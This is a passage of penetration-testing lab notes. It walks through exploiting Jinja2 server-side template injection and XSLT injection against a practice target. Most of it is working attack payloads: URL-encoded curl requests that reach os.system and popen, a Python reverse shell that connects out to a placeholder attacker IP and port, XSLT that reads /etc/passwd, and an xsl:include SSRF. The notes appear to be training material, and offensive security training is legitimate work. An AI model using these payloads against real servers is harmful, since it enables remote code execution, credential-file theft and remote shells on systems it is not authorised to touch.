curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%20range%28450%29%20%25%7D%0A%7B%7B%20i%20%7D%7D%0A%7B%7B%20%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5Bi%5D.__name__%20%7D%7D%0A%7B%25%20endfor%20%25%7D"
```
As you can see in the application's response, `catch_warnings` is located at index #214.
#### We have everything we need to construct an RCE payload, such as the following
```Python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}
```
#### Use as a URL encoded payload with cURL
```Shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.system%28%22touch%20%2Ftmp%2Ftest1%22%29%20%7D%7D"
```

The application returns `0` in its response. This is the return of the value of the command we just executed. `0` indicates that the command was executed without errors.
#### Identify if `test1` was created using the following payload
```Python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}
```
#### Use as a URL encoded payload with cURL
```Shell
curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B214%5D%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%27ls%20%2Ftmp%27%29.read%28%29%7D%7D"
```

Now that we have gone through the payload development process, it's worth mentioning that we can use some specific functions to facilitate the exploitation of Jinja2 SSTI vulnerabilities. Those are `request` and `lipsum`. Feel free to submit them to this section's target.
```python
{{lipsum.__globals__.os.popen('id').read()}}
```

```python
{{lipsum.__globals__.os.popen('id').read()}}
```
#### A reverse shell can also be established through a payload such as the below.
```python
{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<PENTESTER_IP>",<PENTESTER_PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}
```
## Attacking XSLT
#### Installation of Required Packages
```Shell
apt install default-jdk libsaxon-java libsaxonb-java
```
#### Create the following files:
##### catalogue.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
  <cd>
    <title>Empire Burlesque</title>
    <artist>Bob Dylan</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>10.90</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Hide your heart</title>
    <artist>Bonnie Tyler</artist>
    <country>UK</country>
    <company>CBS Records</company>
    <price>9.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Greatest Hits</title>
    <artist>Dolly Parton</artist>
    <country>USA</country>
    <company>RCA</company>
    <price>9.90</price>
    <year>1982</year>
  </cd>
  <cd>
    <title>Still got the blues</title>
    <artist>Gary Moore</artist>
    <country>UK</country>
    <company>Virgin records</company>
    <price>10.20</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Eros</title>
    <artist>Eros Ramazzotti</artist>
    <country>EU</country>
    <company>BMG</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>One night only</title>
    <artist>Bee Gees</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>10.90</price>
    <year>1998</year>
  </cd>
  <cd>
    <title>Sylvias Mother</title>
    <artist>Dr.Hook</artist>
    <country>UK</country>
    <company>CBS</company>
    <price>8.10</price>
    <year>1973</year>
  </cd>
  <cd>
    <title>Maggie May</title>
    <artist>Rod Stewart</artist>
    <country>UK</country>
    <company>Pickwick</company>
    <price>8.50</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Romanza</title>
    <artist>Andrea Bocelli</artist>
    <country>EU</country>
    <company>Polydor</company>
    <price>10.80</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>When a man loves a woman</title>
    <artist>Percy Sledge</artist>
    <country>USA</country>
    <company>Atlantic</company>
    <price>8.70</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Black angel</title>
    <artist>Savage Rose</artist>
    <country>EU</country>
    <company>Mega</company>
    <price>10.90</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>1999 Grammy Nominees</title>
    <artist>Many</artist>
    <country>USA</country>
    <company>Grammy</company>
    <price>10.20</price>
    <year>1999</year>
  </cd>
  <cd>
    <title>For the good times</title>
    <artist>Kenny Rogers</artist>
    <country>UK</country>
    <company>Mucik Master</company>
    <price>8.70</price>
    <year>1995</year>
  </cd>
  <cd>
    <title>Big Willie style</title>
    <artist>Will Smith</artist>
    <country>USA</country>
    <company>Columbia</company>
    <price>9.90</price>
    <year>1997</year>
  </cd>
  <cd>
    <title>Tupelo Honey</title>
    <artist>Van Morrison</artist>
    <country>UK</country>
    <company>Polydor</company>
    <price>8.20</price>
    <year>1971</year>
  </cd>
  <cd>
    <title>Soulsville</title>
    <artist>Jorn Hoel</artist>
    <country>Norway</country>
    <company>WEA</company>
    <price>7.90</price>
    <year>1996</year>
  </cd>
  <cd>
    <title>The very best of</title>
    <artist>Cat Stevens</artist>
    <country>UK</country>
    <company>Island</company>
    <price>8.90</price>
    <year>1990</year>
  </cd>
  <cd>
    <title>Stop</title>
    <artist>Sam Brown</artist>
    <country>UK</country>
    <company>A and M</company>
    <price>8.90</price>
    <year>1988</year>
  </cd>
  <cd>
    <title>Bridge of Spies</title>
    <artist>T`Pau</artist>
    <country>UK</country>
    <company>Siren</company>
    <price>7.90</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Private Dancer</title>
    <artist>Tina Turner</artist>
    <country>UK</country>
    <company>Capitol</company>
    <price>8.90</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Midt om natten</title>
    <artist>Kim Larsen</artist>
    <country>EU</country>
    <company>Medley</company>
    <price>7.80</price>
    <year>1983</year>
  </cd>
  <cd>
    <title>Pavarotti Gala Concert</title>
    <artist>Luciano Pavarotti</artist>
    <country>UK</country>
    <company>DECCA</company>
    <price>9.90</price>
    <year>1991</year>
  </cd>
  <cd>
    <title>The dock of the bay</title>
    <artist>Otis Redding</artist>
    <country>USA</country>
    <company>Stax Records</company>
    <price>7.90</price>
    <year>1968</year>
  </cd>
  <cd>
    <title>Picture book</title>
    <artist>Simply Red</artist>
    <country>EU</country>
    <company>Elektra</company>
    <price>7.20</price>
    <year>1985</year>
  </cd>
  <cd>
    <title>Red</title>
    <artist>The Communards</artist>
    <country>UK</country>
    <company>London</company>
    <price>7.80</price>
    <year>1987</year>
  </cd>
  <cd>
    <title>Unchain my heart</title>
    <artist>Joe Cocker</artist>
    <country>USA</country>
    <company>EMI</company>
    <price>8.20</price>
    <year>1987</year>
  </cd>
</catalog>
```
##### transformation.xsl
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
  <html>
  <body>
    <h2>My CD Collection</h2>
    <table border="1">
      <tr bgcolor="#9acd32">
        <th>Title</th>
        <th>Artist</th>
      </tr>
      <tr>
        <td><xsl:value-of select="catalog/cd/title"/></td>
        <td><xsl:value-of select="catalog/cd/artist"/></td>
      </tr>
    </table>
  </body>
  </html>
</xsl:template>
</xsl:stylesheet>
```
- The first line is usually the XML version and encoding
- Next, it will have the XSL root node `xsl:stylesheet`
- Then, we will have the directives in `xsl:template match="<PATH>"`. In this case, it will apply to any XML node.
- After that, the transformation is defined for any item in the XML structure matching the previous line.
- To select certain items from the XML document, XPATH language is used in the form of `<xsl:value-of select="<NODE>/<SUBNODE>/<VALUE>"/>`.
#### Transformation through the terminal
```Shell
saxonb-xslt -xsl:transformation.xsl catalogue.xml
```
#### The following file can be used to detect the underlying preprocessor
##### detection.xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:output method="html"/>
<xsl:template match="/">
    <h2>XSLT identification</h2>
    <b>Version:</b> <xsl:value-of select="system-property('xsl:version')"/><br/>
    <b>Vendor:</b> <xsl:value-of select="system-property('xsl:vendor')" /><br/>
    <b>Vendor URL:</b><xsl:value-of select="system-property('xsl:vendor-url')" /><br/>
</xsl:template>
</xsl:stylesheet>
```
#### Run the previous command, but using the detection file instead
```Shell
saxonb-xslt -xsl:detection.xsl catalogue.xml
```
Output:
```
Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
  Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```
Based on the preprocessor, we can go to the XSLT documentation for this version to identify functions of interest, such as the below.
- `unparsed-text` can be used to read local files.
#### Using unparsed-text to read local files
##### readfile.xsl
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
##### Using readfile w/ saxonb-xslt to read `/etc/passwd`
```Shell
saxonb-xslt -xsl:readfile.xsl catalogue.xml
```
#### `xsl:include` can be used to perform SSRF
##### ssrf.xsl
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:5000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```
##### Using the ssrf.xsl file to perform SSRF
```Shell
saxonb-xslt -xsl:ssrf.xsl catalogue.xml
```
#### File for fingerprinting
##### fingerprinting.xsl
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
 <xsl:if test="system-property('xsl:product-name')">
 Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:product-version')">
 Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:is-schema-aware')">
 Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-serialization')">
 Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
 </xsl:if>
 <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
 Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
 </xsl:if>
</xsl:template>
</xsl:stylesheet>
```
##### Running the fingerprinting file
```Shell
saxonb-xslt -xsl:fingerprinting.xsl catalogue.xml
```
#### [Auto_Wordlists/wordlists/xslt.txt at main · carlospolop/Auto_Wordlists · GitHub](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xslt.txt)
